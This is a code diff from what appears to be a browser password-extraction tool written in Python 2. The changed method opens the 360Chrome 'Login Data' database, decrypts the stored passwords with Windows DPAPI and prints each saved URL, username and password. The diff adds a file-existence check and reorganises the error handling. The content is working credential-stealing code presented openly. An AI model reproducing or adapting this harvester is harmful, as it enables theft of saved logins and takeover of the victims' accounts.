@@ -65,25 +65,26 @@ class decypt():
     def get_decypt_360chrome(self):
         file_path = os.path.join(
             constant.profile['LOCALAPPDATA'],r'360Chrome\Chrome\User Data\Default\Login Data')
-        databases = self.copy_db(file_path,tmp + os.sep + self.str_rangdom())
-        conn = sqlite3.connect(databases)
-        cursor = conn.cursor()
-        cursor.execute(
-            'SELECT action_url, username_value, password_value FROM logins')
-        try:
-            for result in cursor.fetchall():
-                password = win32crypt.CryptUnprotectData(
-                    result[2], None, None, None, 0)[1]
-                if password:
-                    print "360 browser decryption result: "
-                    print 'Title: ' + result[0]
-                    print 'Username: ' + result[1]
-                    print 'Password: ' + password
-        except Exception:
-            pass
-        finally:
-            conn.close()
-            os.remove(databases)
+        if os.path.exists(file_path):
+            databases = self.copy_db(file_path,tmp + os.sep + self.str_rangdom())
+            try:
+                conn = sqlite3.connect(databases)
+                cursor = conn.cursor()
+                print '[*] Finding histroy in 360Chrome'
+                cursor.execute(
+                    'SELECT action_url, username_value, password_value FROM logins')
+                for result in cursor.fetchall():
+                    password = win32crypt.CryptUnprotectData(
+                        result[2], None, None, None, 0)[1]
+                    if password:
+                        print "360 browser decryption result: "
+                        print 'Title: ' + result[0]
+                        print 'Username: ' + result[1]
+                        print 'Password: ' + password
+                conn.close()
+                os.remove(databases)
+            except Exception :
+                pass
 
     def get_firefox_profiles(self):
 
